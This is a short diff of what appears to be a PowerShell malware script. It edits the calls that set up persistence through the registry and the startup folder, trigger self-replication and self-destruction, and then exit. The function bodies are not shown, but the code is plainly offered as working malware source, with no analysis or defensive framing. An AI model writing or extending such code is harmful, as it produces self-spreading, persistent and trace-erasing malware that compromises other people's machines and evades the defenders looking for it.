@@ -257,14 +257,17 @@ function Add-StartupFolderPersistence {
 }
 
 # Llamada a las funciones para agregar persistencia
-Add-RegistryPersistence
-Add-StartupFolderPersistence
+Add-RegistryPersistence;
+Add-StartupFolderPersistence;
 
 ##############################################################################
 
 
 # Call the Invoke-SelfReplication function
-Invoke-SelfReplication
+Invoke-SelfReplication;
 
 # Call the Invoke-SelfDestruction function
-Invoke-SelfDestruction
+Invoke-SelfDestruction;
+
+
+exit;
